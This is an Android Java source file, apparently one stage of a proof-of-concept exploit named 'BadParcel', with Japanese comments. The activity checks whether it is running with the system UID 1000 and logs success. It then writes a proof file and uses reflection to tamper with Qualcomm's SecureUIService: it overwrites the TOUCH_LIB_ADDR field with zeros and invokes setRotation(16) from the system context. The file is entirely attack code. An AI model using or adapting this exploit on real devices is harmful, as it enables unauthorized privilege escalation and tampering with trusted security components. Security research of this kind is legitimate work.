package com.example.tzpoc;

import android.app.Activity;
import android.os.Bundle;
import android.os.Environment;
import android.os.Process;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;

public class ProofActivity extends Activity {
    private static final String TAG = "ProofActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 自身のプロセスUIDを取得（システムから起動されていれば 1000）
        int myUid = Process.myUid();

        String msg = "[+] ProofActivity started. My UID=" + myUid;
        Log.i(TAG, msg);
        MainActivity.appendLog(msg);

        // 自分のUIDがシステム（1000）なら提権成功
        if (myUid == 1000) {
            MainActivity.appendLog("[!!!] SUCCESS: Process running with SYSTEM UID (1000) !!!");
            // 証跡ファイルを作成
            try {
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (!dir.exists()) dir.mkdirs();
                File proof = new File(dir, "uid_proof.txt");
                try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
                    pw.println("Process UID: " + myUid);
                    pw.println("Timestamp: " + new java.util.Date());
                    pw.println("BadParcel exploit succeeded!");
                }
                MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
            } catch (Exception e) {
                MainActivity.appendLog("[-] Failed to create proof file: " + e.getMessage());
            }

            // システム権限で SecureUI リフレクションを試行
            attemptSecureUIReflection();
        } else {
            MainActivity.appendLog("[!] UID=" + myUid + " (not system). Exploit may have failed.");
        }

        // 終了
        finish();
    }

    private void attemptSecureUIReflection() {
        MainActivity.appendLog("[*] Attempting SecureUI reflection from system context...");
        try {
            Class<?> clazz = Class.forName("com.qualcomm.qti.services.secureui.SecureUIService");
            java.lang.reflect.Field contextField = clazz.getDeclaredField("context");
            contextField.setAccessible(true);
            Object context = contextField.get(null);
            MainActivity.appendLog("[+] SecureUIService.context = " + context);

            java.lang.reflect.Field touchField = clazz.getDeclaredField("TOUCH_LIB_ADDR");
            touchField.setAccessible(true);
            byte[] orig = (byte[]) touchField.get(null);
            MainActivity.appendLog("[+] Original TOUCH_LIB_ADDR: " + bytesToHex(orig));

            byte[] newAddr = {0x00,0x00,0x00,0x00,0x00,0x00};
            touchField.set(null, newAddr);
            MainActivity.appendLog("[+] TOUCH_LIB_ADDR modified to zeros");

            java.lang.reflect.Method setRotation = clazz.getMethod("setRotation", int.class);
            setRotation.invoke(null, 16);
            MainActivity.appendLog("[+] setRotation(16) called.");

            touchField.set(null, orig);
            MainActivity.appendLog("[+] TOUCH_LIB_ADDR restored.");
        } catch (Exception e) {
            MainActivity.appendLog("[-] SecureUI reflection failed: " + e.getMessage());
        }
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02X ", b));
        return sb.toString();
    }
}
